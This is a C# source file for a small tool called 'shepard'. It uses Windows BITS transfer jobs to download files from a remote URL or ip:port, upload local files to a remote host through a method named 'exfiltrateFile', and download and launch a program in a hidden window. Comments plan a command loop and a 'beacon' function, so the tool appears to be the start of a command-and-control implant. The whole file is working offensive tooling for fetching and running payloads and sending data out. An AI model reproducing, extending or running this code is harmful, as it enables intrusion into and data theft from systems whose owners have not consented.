using System;
using System.Net;
using BITS = BITSReference1_5;

namespace shepard
{
    class JobObj
    {
        static BITS.BackgroundCopyManager1_5 mgr;
        static BITS.GUID jobGuid;
        static BITS.IBackgroundCopyJob job;
        static JobObj jo;

        public JobObj()
        {
            mgr = new BITS.BackgroundCopyManager1_5();
        }

        public static void Main(string[] args)
        {
            if (args.Length == 0) { return; }

            jo = new JobObj();

            if (args.Length == 3)
            {
                //ex shepard -d remoteLoc writeLoc
                if (args[0] == "-d")
                {
                    jo.downloadFile(args[1], args[2]);
                }
                //ex shepard -e remoteLoc writeLoc
                else if (args[0] == "-e")
                {
                    jo.exfiltrateFile(args[1], args[2]);
                }
            }
            else if (args.Length == 4)
            {
                //ex shepard -dr remoteLoc writeLoc "argument argument argument" 
                if (args[0] == "-dr")
                {
                    jo.downloadFile(args[1], args[2]);
                    jo.runFile(args[2], args[3]);
                }
            }
            else { return; }

        }

        //Usage params: url or ip:port, full path
        private void downloadFile(string remoteLoc, string writeLoc)
        {
            mgr.CreateJob("QD", BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            //job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
            //job.AddFile("23.52.161.19:443", @"C:\Users\student\Desktop\Server2016.pdf");
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob();

        }

        //Usage params: url or ip:port, full path
        private void exfiltrateFile(string remoteLoc, string writeLoc)
        {
            mgr.CreateJob("QU", BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob();
        }
        //somewhere in main, consisent loop for input of command
        //add a beacon function somewhere in main ^

        private void executeBITSJob()
        {
            job.Resume();
            bool jobIsFinal = false;
            while (!jobIsFinal)
            {
                BITS.BG_JOB_STATE state;
                job.GetState(out state);
                switch (state)
                {
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED:
                        job.Complete();
                        break;

                    case BITS.BG_JOB_STATE.BG_JOB_STATE_CANCELLED:
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                        jobIsFinal = true;
                        break;
                    default:
                        System.Threading.Tasks.Task.Delay(500); // delay a little bit
                        break;
                }
            }
        }

        //Usage: path, "args"
        private void runFile(string filePath, string cmdArgs)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = filePath;
            startInfo.Arguments = cmdArgs;
            process.StartInfo = startInfo;

            process.Start();
        }
    }
}
